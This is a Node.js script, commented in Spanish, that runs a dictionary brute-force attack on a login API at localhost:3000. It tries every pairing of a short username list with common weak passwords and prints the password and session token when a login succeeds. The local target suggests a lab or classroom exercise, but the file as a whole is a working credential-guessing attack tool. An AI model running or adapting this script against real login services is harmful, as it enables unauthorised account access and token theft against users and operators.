const fetch = require('node-fetch');  // Instala con: npm install node-fetch@2

const URL = 'http://localhost:3000/api/login';

const usuarios = ['user','usuariogenerico','admin', 'usuario1', 'vini','maria'];
const contraseñas = [
    'password',
    '123456',
    'p4ssw0rd',
    'usuario',
    'admin123',
    'admin',
    '12345',
];

async function loginIntento(usuario, contraseña) {
    try {
        const response = await fetch(URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                username: usuario,
                password: contraseña
            })
        });
        
        const data = await response.json();
        return data;
    } catch (error) {
        console.error(`Error: ${error}`);
        return null;
    }
}

async function ataqueFuerzaBruta() {
    console.log('[*] Iniciando Ataque de Fuerza Bruta con Node.js');
    console.log('-'.repeat(50));
    
    for (const usuario of usuarios) {
        for (const contraseña of contraseñas) {
            const resultado = await loginIntento(usuario, contraseña);
            
            if (resultado && resultado.message === 'Login exitoso') {
                console.log(`[✓] CONTRASEÑA ENCONTRADA!`);
                console.log(`    Usuario: ${usuario}`);
                console.log(`    Contraseña: ${contraseña}`);
                console.log(`    Token: ${resultado.token}`);
                return;
            } else {
                console.log(`[✗] ${usuario} / ${contraseña}`);
            }
        }
    }
    
    console.log('-'.repeat(50));
    console.log('[*] Ataque completado');
}

ataqueFuerzaBruta();